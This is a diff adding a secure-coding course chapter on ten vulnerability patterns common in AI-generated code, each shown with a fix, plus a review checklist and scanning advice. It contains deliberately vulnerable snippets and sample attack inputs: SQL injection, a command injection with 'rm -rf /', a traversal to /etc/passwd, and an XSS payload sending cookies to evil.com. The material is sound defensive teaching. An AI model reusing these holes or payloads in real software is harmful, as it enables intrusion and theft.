@@ -2,6 +2,742 @@
 title: Vulnerable Code Generation Patterns
 ---
 
-# Vulnerable Code Generation Patterns
+In Chapter 1, we explored how sensitive data can leak through AI coding assistants. Now we're tackling an even more fundamental problem: **AI tools regularly generate code that contains security vulnerabilities**.
 
+Here's the uncomfortable truth: AI coding assistants are trained on billions of lines of public code — and much of that code is insecure. When AI generates code, it reproduces the patterns it learned, including the vulnerable ones. The result? Around **48% of AI-generated code contains security vulnerabilities** <sup>[1](#1)</sup>.
 
+This chapter explores why AI generates vulnerable code, what specific vulnerability patterns appear most frequently, and how to catch and fix them before they reach production.
+
+## The Core Problem: Pattern Matching Without Security Understanding
+
+AI coding assistants work through statistical pattern matching. They've seen thousands of examples of authentication code, database queries, API endpoints, and file operations. When you ask them to generate similar code, they produce what statistically "looks right" based on their training data.
+
+But here's the critical issue: **AI doesn't understand security intent**. It doesn't reason about threat models, attack vectors, or security boundaries. It generates code that *looks* functionally correct without considering whether it's *secure*.
+
+Think of it like this: If you trained someone to cook by showing them thousands of random cooking videos from the internet — some from professional chefs, many from amateurs, and some showing outright dangerous practices — they'd learn to make dishes that *look* like food. But they might also reproduce unsafe food handling practices because those appeared frequently in the training data.
+
+That's exactly what's happening with AI-generated code.
+
+## The Research: How Bad Is It Really?
+
+Before we dive into specific vulnerability patterns, let's look at what research tells us about the scope of this problem:
+
+### Key Findings from Academic Studies
+
+Multiple studies point to a consistent pattern: AI assistance increases the speed of coding but also the likelihood that security flaws slip in. A 2024 large-scale comparison found roughly half of AI-generated snippets contained exploitable vulnerabilities, with SQL injection and path traversal among the most common <sup>[1](#1)</sup>. A 2023 controlled study showed developers using assistance were more likely to introduce vulnerabilities—and to trust the output—resulting in measurably less secure code overall <sup>[2](#2)</sup>. A 2024 systematic review across models observed persistently high vulnerability rates even for stronger models in security‑critical scenarios <sup>[3](#3)</sup>. Earlier work analyzing Copilot outputs found around 40% of suggestions had security weaknesses, especially around auth, crypto, and input handling <sup>[4](#4)</sup>.
+
+### The False Security Effect
+
+Perhaps most concerning is the trust gap: many developers feel AI output is safer than it is. Surveys indicate strong perceived security benefits, yet empirical analyses consistently show the opposite—AI code often needs more scrutiny, not less. This over‑confidence leads reviewers to skim rather than challenge suggestions, letting issues through <sup>[5](#5)</sup>.
+
+This creates a perfect storm: vulnerable code being generated at scale and accepted without adequate review.
+
+## The Top 10 Vulnerable Code Patterns AI Generates
+
+Let's explore the most common security vulnerabilities that appear in AI-generated code, with real examples and fixes.
+
+### 1. SQL Injection (Most Common)
+
+*Why this happens:* String‑building for queries is ubiquitous online, so assistants reproduce it—even though parameterization is the secure default.
+
+**Vulnerable code (AI-generated):**
+
+```python
+def get_user_by_username(username):
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    cursor.execute(query)
+    return cursor.fetchone()
+```
+
+This allows an attacker to manipulate `username` and execute arbitrary SQL:
+```python
+username = "admin' OR '1'='1' --"
+# Resulting query: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
+# This returns all users, bypassing authentication
+```
+
+**Secure version:**
+
+```python
+def get_user_by_username(username):
+    query = "SELECT * FROM users WHERE username = ?"
+    cursor.execute(query, (username,))
+    return cursor.fetchone()
+```
+
+Parameterization cleanly separates SQL logic from user data, preventing injection.
+
+### 2. Missing Authentication & Authorization
+
+*Why this happens:* Prompts emphasize functionality (“create an endpoint”) while security boundaries (who can call it? for which resource?) are often unstated and therefore omitted.
+
+**Vulnerable code (AI-generated):**
+
+```javascript
+app.post('/api/users/:id/update', async (req, res) => {
+  const { id } = req.params;
+  const { email, role } = req.body;
+  
+  const user = await db.users.update(id, { email, role });
+  res.json({ success: true, user });
+});
+```
+
+Without explicit checks, anyone can call the endpoint, update other users, and even escalate privileges by changing roles.
+
+**Secure version:**
+
+```javascript
+app.post('/api/users/:id/update', 
+  requireAuth,           // Middleware: must be logged in
+  async (req, res) => {
+    const { id } = req.params;
+    const { email } = req.body;  // Don't accept 'role' from request
+    
+    // Authorization: users can only update themselves
+    if (req.user.id !== id && !req.user.roles.includes('admin')) {
+      return res.status(403).json({ error: 'Forbidden' });
+    }
+    
+    // Validate email format
+    if (!isValidEmail(email)) {
+      return res.status(400).json({ error: 'Invalid email' });
+    }
+    
+    const user = await db.users.update(id, { email });
+    res.json({ success: true, userId: user.id });
+  }
+);
+```
+
+### 3. Command Injection
+
+*Why this happens:* Many examples interpolate untrusted input into shell commands; assistants mirror that pattern.
+
+**Vulnerable code (AI-generated):**
+
+```python
+import subprocess
+
+def resize_image(filename, width, height):
+    cmd = f"convert {filename} -resize {width}x{height} output.jpg"
+    subprocess.run(cmd, shell=True)
+```
+
+**The problem:** An attacker can inject shell commands:
+```python
+filename = "image.jpg; rm -rf /"
+# Resulting command: convert image.jpg; rm -rf / -resize 100x100 output.jpg
+```
+
+**Secure version:**
+
+```python
+import subprocess
+import shlex
+
+def resize_image(filename, width, height):
+    # Validate inputs
+    if not filename.endswith(('.jpg', '.png', '.gif')):
+        raise ValueError("Invalid file type")
+    if not (0 < width < 10000 and 0 < height < 10000):
+        raise ValueError("Invalid dimensions")
+    
+    # Use list format instead of shell=True
+    cmd = ['convert', filename, '-resize', f'{width}x{height}', 'output.jpg']
+    subprocess.run(cmd, shell=False, check=True)
+```
+
+### 4. Path Traversal / Directory Traversal
+
+**Why AI generates this:** File operations with user input are common, and proper validation is often omitted in training data.
+
+**Vulnerable code (AI-generated):**
+
+```python
+from flask import Flask, request, send_file
+
+app = Flask(__name__)
+
+@app.route('/download')
+def download_file():
+    filename = request.args.get('file')
+    return send_file(f'/var/www/uploads/{filename}')
+```
+
+**The problem:** Attacker can access any file:
+```python
+# Request: /download?file=../../../etc/passwd
+# Accesses: /var/www/uploads/../../../etc/passwd = /etc/passwd
+```
+
+**Secure version:**
+
+```python
+from flask import Flask, request, send_file, abort
+import os
+
+app = Flask(__name__)
+UPLOAD_DIR = '/var/www/uploads'
+
+@app.route('/download')
+def download_file():
+    filename = request.args.get('file')
+    
+    # Validate filename
+    if not filename or '/' in filename or '\\' in filename:
+        abort(400, "Invalid filename")
+    
+    # Construct full path and resolve it
+    file_path = os.path.join(UPLOAD_DIR, filename)
+    file_path = os.path.realpath(file_path)
+    
+    # Ensure the resolved path is still within UPLOAD_DIR
+    if not file_path.startswith(os.path.realpath(UPLOAD_DIR)):
+        abort(403, "Access denied")
+    
+    # Check file exists
+    if not os.path.isfile(file_path):
+        abort(404, "File not found")
+    
+    return send_file(file_path)
+```
+
+### 5. Insecure Deserialization
+
+**Why AI generates this:** Serialization libraries are widely used, and security implications aren't obvious in code examples.
+
+**Vulnerable code (AI-generated):**
+
+```python
+import pickle
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/api/load_session', methods=['POST'])
+def load_session():
+    session_data = request.data
+    user_session = pickle.loads(session_data)  # DANGEROUS
+    return {'user': user_session}
+```
+
+**The problem:** Pickle can execute arbitrary code during deserialization. An attacker can craft malicious serialized data that executes code on the server.
+
+**Secure version:**
+
+```python
+import json
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/api/load_session', methods=['POST'])
+def load_session():
+    try:
+        # Use JSON instead of pickle
+        session_data = json.loads(request.data)
+        
+        # Validate the structure
+        required_keys = {'user_id', 'username', 'created_at'}
+        if not required_keys.issubset(session_data.keys()):
+            return {'error': 'Invalid session format'}, 400
+        
+        return {'user': session_data}
+    except json.JSONDecodeError:
+        return {'error': 'Invalid JSON'}, 400
+```
+
+### 6. Missing Input Validation
+
+**Why AI generates this:** AI focuses on the "happy path" and often omits validation logic.
+
+**Vulnerable code (AI-generated):**
+
+```javascript
+app.post('/api/transfer', async (req, res) => {
+  const { from_account, to_account, amount } = req.body;
+  
+  await db.accounts.decrement(from_account, amount);
+  await db.accounts.increment(to_account, amount);
+  
+  res.json({ success: true });
+});
+```
+
+**The problems:**
+- No validation that amount is positive (can transfer negative amounts to steal money)
+- No check for sufficient balance
+- No validation of account IDs
+- No rate limiting
+- No transaction atomicity
+
+**Secure version:**
+
+```javascript
+app.post('/api/transfer', 
+  requireAuth,
+  rateLimit({ max: 10, window: '1h' }),
+  async (req, res) => {
+    const { from_account, to_account, amount } = req.body;
+    
+    // Validate ownership
+    if (from_account !== req.user.account_id) {
+      return res.status(403).json({ error: 'Forbidden' });
+    }
+    
+    // Validate inputs
+    const parsedAmount = parseFloat(amount);
+    if (isNaN(parsedAmount) || parsedAmount <= 0 || parsedAmount > 1000000) {
+      return res.status(400).json({ error: 'Invalid amount' });
+    }
+    
+    // Validate accounts exist
+    const fromAcct = await db.accounts.findOne(from_account);
+    const toAcct = await db.accounts.findOne(to_account);
+    if (!fromAcct || !toAcct) {
+      return res.status(404).json({ error: 'Account not found' });
+    }
+    
+    // Use database transaction for atomicity
+    const transaction = await db.transaction();
+    try {
+      // Check sufficient balance
+      if (fromAcct.balance < parsedAmount) {
+        throw new Error('Insufficient funds');
+      }
+      
+      await transaction.accounts.decrement(from_account, parsedAmount);
+      await transaction.accounts.increment(to_account, parsedAmount);
+      await transaction.commit();
+      
+      res.json({ success: true });
+    } catch (error) {
+      await transaction.rollback();
+      res.status(400).json({ error: error.message });
+    }
+  }
+);
+```
+
+### 7. Cross-Site Scripting (XSS)
+
+**Why AI generates this:** Templating and output generation code often omits proper escaping.
+
+**Vulnerable code (AI-generated):**
+
+```javascript
+app.get('/profile/:username', async (req, res) => {
+  const username = req.params.username;
+  const user = await db.users.findOne({ username });
+  
+  const html = `
+    <h1>Profile: ${username}</h1>
+    <p>Bio: ${user.bio}</p>
+    <p>Website: <a href="${user.website}">${user.website}</a></p>
+  `;
+  
+  res.send(html);
+});
+```
+
+**The problem:** User-supplied data is inserted directly into HTML without escaping.
+
+```javascript
+// Attacker sets bio to:
+bio = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
+// This script executes in other users' browsers, stealing cookies
+```
+
+**Secure version:**
+
+```javascript
+const escapeHtml = (unsafe) => {
+  return unsafe
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+};
+
+app.get('/profile/:username', async (req, res) => {
+  const username = escapeHtml(req.params.username);
+  const user = await db.users.findOne({ username: req.params.username });
+  
+  if (!user) {
+    return res.status(404).send('User not found');
+  }
+  
+  const html = `
+    <h1>Profile: ${username}</h1>
+    <p>Bio: ${escapeHtml(user.bio)}</p>
+    <p>Website: <a href="${escapeHtml(user.website)}">${escapeHtml(user.website)}</a></p>
+  `;
+  
+  res.send(html);
+});
+
+// Better: Use a templating engine with auto-escaping like EJS, Handlebars, or React
+```
+
+### 8. Insecure Cryptography
+
+**Why AI generates this:** Cryptography examples in training data often use outdated or weak algorithms.
+
+**Vulnerable code (AI-generated):**
+
+```python
+import hashlib
+
+def hash_password(password):
+    return hashlib.md5(password.encode()).hexdigest()
+
+def verify_password(password, hash):
+    return hash_password(password) == hash
+```
+
+**The problems:**
+- MD5 is cryptographically broken
+- No salt (same password = same hash)
+- Fast hashing enables brute force attacks
+- Rainbow tables can crack these instantly
+
+**Secure version:**
+
+```python
+import bcrypt
+
+def hash_password(password):
+    # bcrypt automatically handles salting and uses adaptive hashing
+    salt = bcrypt.gensalt(rounds=12)  # Adjust work factor as needed
+    return bcrypt.hashpw(password.encode(), salt)
+
+def verify_password(password, hashed):
+    return bcrypt.checkpw(password.encode(), hashed)
+```
+
+### 9. Hardcoded Secrets & Credentials
+
+**Why AI generates this:** Training data contains countless examples with hardcoded credentials (often fake examples that look real).
+
+**Vulnerable code (AI-generated):**
+
+```python
+import requests
+
+def send_notification(message):
+    api_key = "sk_live_abc123xyz789"  # Hardcoded API key
+    webhook_url = "https://api.service.com/notify"
+    
+    response = requests.post(
+        webhook_url,
+        headers={"Authorization": f"Bearer {api_key}"},
+        json={"message": message}
+    )
+    return response.json()
+```
+
+**The problems:**
+- API key is committed to version control
+- Anyone with code access has production credentials
+- Key rotation requires code changes
+- Keys can leak through logs, error messages, or Stack Overflow posts
+
+**Secure version:**
+
+```python
+import os
+import requests
+from dotenv import load_dotenv
+
+load_dotenv()
+
+def send_notification(message):
+    # Load from environment variable
+    api_key = os.getenv('NOTIFICATION_API_KEY')
+    if not api_key:
+        raise ValueError("NOTIFICATION_API_KEY environment variable not set")
+    
+    webhook_url = os.getenv('NOTIFICATION_WEBHOOK_URL')
+    
+    response = requests.post(
+        webhook_url,
+        headers={"Authorization": f"Bearer {api_key}"},
+        json={"message": message}
+    )
+    return response.json()
+```
+
+### 10. Missing Error Handling & Information Disclosure
+
+**Why AI generates this:** AI generates the "happy path" logic but often omits comprehensive error handling.
+
+**Vulnerable code (AI-generated):**
+
+```python
+@app.route('/api/user/<user_id>')
+def get_user(user_id):
+    user = db.session.query(User).filter_by(id=user_id).one()
+    return jsonify(user.to_dict())
+```
+
+**The problems:**
+- No error handling for invalid user_id
+- Database errors expose stack traces to users
+- Exception messages may contain sensitive information
+- No logging for debugging
+
+**Secure version:**
+
+```python
+import logging
+
+logger = logging.getLogger(__name__)
+
+@app.route('/api/user/<user_id>')
+def get_user(user_id):
+    try:
+        # Validate input
+        try:
+            user_id = int(user_id)
+        except ValueError:
+            return jsonify({'error': 'Invalid user ID'}), 400
+        
+        user = db.session.query(User).filter_by(id=user_id).one_or_none()
+        
+        if user is None:
+            return jsonify({'error': 'User not found'}), 404
+        
+        return jsonify(user.to_dict())
+        
+    except Exception as e:
+        # Log the full error for debugging
+        logger.error(f"Error fetching user {user_id}: {str(e)}", exc_info=True)
+        
+        # Return generic error to user (don't expose internal details)
+        return jsonify({'error': 'Internal server error'}), 500
+```
+
+## Why These Patterns Keep Appearing
+
+Understanding *why* AI generates these vulnerable patterns helps us address the root causes:
+
+### 1. Training Data Contains Vulnerable Code
+
+The internet is full of insecure code examples. Stack Overflow answers, tutorial blogs, GitHub repositories — many contain vulnerabilities. When AI trains on this data, it learns both good and bad patterns.
+
+### 2. Security is Context-Dependent
+
+What's secure in one context may be insecure in another. AI lacks the contextual understanding to know when security controls are needed. A code snippet that's fine for a local script becomes dangerous in a public API.
+
+### 3. The "Happy Path" Bias
+
+Training data disproportionately shows functional code, not defensive code. Examples focus on making things work, not on edge cases, error handling, or security boundaries.
+
+### 4. No Threat Modeling
+
+AI doesn't think like an attacker. It doesn't ask "how could this be abused?" or "what if the user is malicious?" It generates code that assumes good-faith inputs.
+
+### 5. Implicit Assumptions
+
+Secure code often relies on implicit context: middleware, frameworks, environment configuration. AI generates isolated code snippets without these protective layers.
+
+## How to Catch Vulnerable AI Code Before It Ships
+
+Now that you know what to look for, here's how to systematically catch these issues:
+
+### 1. Code Review Checklist for AI-Generated Code
+
+When reviewing AI-generated code, explicitly check:
+
+**Authentication & Authorization:**
+- [ ] Does this endpoint/function require authentication?
+- [ ] Are there authorization checks for resource access?
+- [ ] Can users access resources they don't own?
+- [ ] Can users escalate their privileges?
+
+**Input Validation:**
+- [ ] Are all inputs validated (type, range, format)?
+- [ ] Is there sanitization for special characters?
+- [ ] Are file uploads restricted by type and size?
+- [ ] Are there rate limits to prevent abuse?
+
+**SQL & Command Injection:**
+- [ ] Are database queries parameterized?
+- [ ] Are shell commands avoided or properly escaped?
+- [ ] Is user input ever concatenated into queries/commands?
+
+**Output Encoding:**
+- [ ] Is user data escaped before displaying in HTML?
+- [ ] Are there XSS protections in place?
+- [ ] Is Content-Security-Policy configured?
+
+**Cryptography:**
+- [ ] Are modern, secure algorithms used (bcrypt, argon2, not MD5/SHA1)?
+- [ ] Is sensitive data encrypted at rest and in transit?
+- [ ] Are secrets stored in environment variables, not code?
+
+**Error Handling:**
+- [ ] Are errors caught and logged appropriately?
+- [ ] Do error messages reveal sensitive information?
+- [ ] Are stack traces hidden from users?
+
+**Session Management:**
+- [ ] Secure cookies (httpOnly, secure, sameSite), sensible timeouts, strong/random session IDs
+
+### 2. Automated Security Scanning
+
+Integrate these tools into your workflow:
+
+**Static Application Security Testing (SAST):**
+- **Semgrep** — Fast, customizable pattern matching for security issues
+- **Snyk Code** — AI-powered security analysis with fix suggestions
+- **SonarQube** — Comprehensive code quality and security scanning
+- **Bandit** (Python) — Security linting for Python code
+- **ESLint Security Plugin** (JavaScript) — Security rules for JavaScript/Node.js
+
+**IDE Integration:**
+Many SAST tools have IDE plugins that flag issues in real-time:
+- Snyk plugin for VS Code
+- SonarLint for multiple IDEs
+- Semgrep extension
+
+### 3. Pre-Commit Hooks
+
+Prevent vulnerable code from being committed:
+- Add Bandit (Python), Semgrep, and detect-secrets hooks
+- Fail on high-severity findings; require fixes before commit
+
+### 4. CI/CD Security Gates
+
+Block merges if security issues are found:
+- Run Semgrep/Snyk/Sonar in PRs; block on critical issues
+- Require security review for auth/crypto changes
+
+### 5. Security-Focused Prompting
+
+Guide AI toward secure code from the start:
+
+**❌ Bad prompt:**
+```
+Create a login endpoint
+```
+
+**✅ Good prompt:**
+```
+Create a secure login endpoint with:
+- Rate limiting (5 attempts per 15 minutes)
+- Bcrypt password hashing
+- Parameterized SQL queries
+- Input validation
+- Secure session cookies
+- No stack trace exposure in errors
+```
+
+**Even better - use `.github/copilot-instructions.md`:**
+```markdown
+# Security Requirements
+
+When generating code, always include:
+
+## Authentication & Authorization
+- All endpoints require authentication unless explicitly public
+- Check user permissions before data access
+- Use role-based access control (RBAC)
+
+## Input Validation
+- Validate all inputs (type, range, format)
+- Sanitize special characters
+- Use allowlists over denylists
+
+## Database Queries
+- Always use parameterized queries
+- Never concatenate user input into SQL
+- Use ORMs with prepared statements
+
+## Cryptography
+- Use bcrypt or argon2 for password hashing (never MD5/SHA1)
+- Generate secure random values with crypto libraries
+- Store secrets in environment variables
+
+## Error Handling
+- Log errors server-side with context
+- Return generic error messages to users
+- Never expose stack traces in responses
+
+## Security Headers
+- Set Content-Security-Policy
+- Use httpOnly and secure flags on cookies
+- Implement CORS restrictions
+```
+
+## Real-World Incident (Condensed)
+
+Anonymized SaaS team shipped an AI-generated data export endpoint without security review. Within two weeks:
+- Vulnerabilities: SQL injection, no auth/authz, path traversal, broad data exposure
+- Exploitation: attackers enumerated users, exfiltrated database, read secrets via file paths
+- Impact: 47k user records exposed (GDPR), significant fine and reputational damage
+- Root causes: over-trust in AI output, missing SAST gate, weak code review, no secure prompting
+- Preventable with: secure prompting requirements, parameterized queries, auth/authz checks, SAST in CI, senior review
+
+## Practical Defense Strategy
+
+Use the earlier "How to Catch Vulnerable AI Code" section as the single source of truth:
+- Apply the review checklist
+- Run IDE linting, pre-commit hooks, and SAST in CI
+- Use security-focused prompting and repository instructions
+- Require senior review for AI-assisted changes
+
+## Key Takeaways
+
+Before moving to the next chapter, make sure you understand:
+
+- **48% of AI-generated code contains vulnerabilities** — This isn't hypothetical; it's measured reality
+- **Top vulnerability patterns** — SQL injection, missing auth, command injection, path traversal, XSS, weak crypto
+- **AI doesn't understand security** — It pattern-matches without reasoning about threats
+- **False security effect** — Developers trust AI code more than they should
+- **Multiple layers of defense needed** — Prevention, detection, verification, validation
+- **Secure prompting matters** — Explicitly request security controls in your prompts
+- **Automated scanning is essential** — SAST, IDE linting, CI/CD gates catch what humans miss
+- **Never skip code review** — AI-generated code needs MORE scrutiny, not less
+- **Real-world impact** — Vulnerabilities reach production and cause real breaches
+
+<Woz 
+title="Security Challenge" 
+description="Test your vulnerability detection skills 🔍" 
+context={`Show the user this vulnerable AI-generated code and ask them to identify at least 3 security issues:
+
+\`\`\`python
+@app.route('/api/delete_account')
+def delete_account():
+    username = request.args.get('username')
+    query = f"DELETE FROM users WHERE username = '{username}'"
+    db.execute(query)
+    return jsonify({'status': 'deleted'})
+\`\`\`
+
+After they respond, explain what they found correctly and highlight any issues they missed.`}
+prompt="Ask me to identify security vulnerabilities in this code."
+/>
+
+---
+
+## Sources and Further Reading
+
+<a id="1">[1]</a> **arXiv (2024)** – [How secure is AI-generated Code: A Large-Scale Comparison of Large Language Models](https://arxiv.org/abs/2404.18353)
+
+<a id="2">[2]</a> **arXiv (2023)** – [Do Users Write More Insecure Code with AI Assistants?](https://arxiv.org/abs/2211.03622)
+
+<a id="3">[3]</a> **IEEE Security & Privacy (2024)** – [State of the Art of the Security of Code Generated by LLMs: A Systematic Literature Review](https://ieeexplore.ieee.org/document/10795572)
+
+<a id="4">[4]</a> **arXiv (2021)** – [Asleep at the Keyboard? Assessing the Security of GitHub Copilot's Code Contributions](https://arxiv.org/abs/2108.09293)
+
+<a id="5">[5]</a> **Snyk (2024)** – [2024 Open Source Security Report: Slowing Progress and New Challenges for DevSecOps](https://snyk.io/blog/2024-open-source-security-report-slowing-progress-and-new-challenges-for/)
+
+### Additional Resources
+
+- **OWASP Top 10** – [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
+- **CWE Top 25** – Common Weakness Enumeration for software vulnerabilities
+- **Semgrep Rules** – Community security rules for detecting vulnerabilities
+- **NIST Secure Software Development Framework** – Guidelines for secure SDLC
